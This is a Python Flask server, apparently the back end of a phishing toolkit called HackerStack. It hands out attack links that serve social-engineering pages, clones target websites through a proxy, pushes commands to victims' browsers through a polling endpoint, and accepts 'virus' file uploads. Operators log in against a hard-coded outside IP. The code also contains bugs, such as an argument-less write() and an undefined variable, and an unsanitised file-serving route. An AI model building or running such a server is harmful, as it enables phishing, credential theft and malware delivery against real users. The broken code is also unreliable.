
import os
from flask import Flask,request , Response
from flask_cors import CORS
import requests
import hashlib
import random
import string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import asyncio
import mimetypes
import threading
import time
from urllib.parse import unquote


import config_loader as config_loader



app = Flask(__name__)
CORS(app)


url_list = {}
config: config_loader = None
visit_request = {}

class user_sessen():
    username: str = ''
    url: str = ''
    attack_type: str = ''
    message: str ='none'
    url_clone: str = ''

def get_random() -> str:
    # 定义可用的字符集，包括26个英文字母（大小写）和数字
    characters = string.ascii_letters + string.digits
    # 生成一个10个字符长度的随机字符串
    random_string = ''.join(random.choice(characters) for _ in range(10))
    if random_string in url_list.keys():
        return get_random()
    else:
        return random_string

@app.route('/push/<attack_url>/<message>')
def get_message(attack_url,message):

    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 9:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1

    if attack_url in url_list.keys():
        url_list.get(attack_url).message = unquote(message)
        return 'ok'

    else:
        return 'your message error'

@app.route('/update_virus/<filename>' , methods=['POST'])
def update_virus(filename):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 6:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1

    if str(filename).strip().lower() == "index.html" or str(filename).strip().lower() == "index.htm":
        return 'FILE NAME IS NULL: index.html or index.htm'

    current_time = time.time()  # 获取当前时间戳
    local_time = time.localtime(current_time)  # 将时间戳转换为本地时间
    formatted_time = time.strftime("%Y-%m-%d %H:%M:%S", local_time)  # 格式化时间

    data = request.get_data()
    if len(data) > 1024 * 1024 * 10:
        return 'MAX UPDATE: 10MB.'

    with open('virus/' + formatted_time+"-"+filename , "wb") as f:
        f.write()
    f.close()
    return 'update ok.'

@app.route('/<path:attack_url>')
def attack_url(attack_url):
    if attack_url in url_list.keys():
        u: user_sessen = url_list.get(attack_url)
        r = Response()
        try:
            # print('modules/socialEngine/'+u.attack_type+"/index.html")
            # print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
            r.data = open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read()
            return r
        except:
            return 'the server error'
                
    else:
        return 'your message error'

@app.route('/run/<attack_url>')
def xhr_run(attack_url):
    if attack_url in url_list.keys():
        u: user_sessen = url_list.get(attack_url)
        # 返回u.message的值
        message_to_return = u.message
        # 更新u.message为'none'
        u.message = 'none'
        # 返回之前存储的消息
        return message_to_return
    else:
        return 'none'
    
@app.route('/resource/<path:url>') 
def get_resource(url):

    full_url = 'resource/' + str(url)
    r = Response()
    r.data = open(full_url , 'rb').read()
    (content_type, encoding) = mimetypes.guess_type(full_url)
    r.headers['Content-Type'] = content_type
    
    return r

@app.route('/w/<attack_token>/<path:url>')
def web_clone_url(attack_token,url):
    if attack_token in url_list.keys():
        u: user_sessen = url_list.get(attack_url)

        r = requests.get(u.url_clone+"/"+url)
        return r.content
    else:
        return 'send message error'

@app.route('/WebClone/<attack_url>/<user>/<pwd>')
def WebClone(attack_url , user , pwd):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 6:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1

    r = requests.post('http://154.201.85.154:11111/login' , data=user+"\n"+pwd)
    if r.text != 'Passwd Or UserName Error!':
        n = get_random()
        
        u = user_sessen()
        u.url = n
        u.attack_type = 'webclone'
        u.username = user
        u.url_clone = attack_url

        url_list[n] = u
        return n

    else:
        return 'your message error' 


@app.route('/api/<attack_type>/<user>/<pwd>/')
def attack(attack_type,user,pwd):

    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 6:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1

    r = requests.post('http://154.201.85.154:11111/login' , data=user+"\n"+pwd)
    if r.text.lower() != 'login failed.':
        n = get_random()
        
        u = user_sessen()
        u.url = n
        u.attack_type = attack_type
        u.username = user

        url_list[n] = u
        return n

    else:
        return 'your message error'

def visit_request_threading() -> None:
    while True:
        time.sleep(60) # 休息 60 秒
        visit_request.clear()

if __name__ == '__main__':
    config = config_loader.HackerStack_Config()

    visit_request_thread = threading.Thread(target=visit_request_threading , name='visit_request')
    visit_request_thread.start()

    app.run(port=int(config.get(
        'server_port'
    )))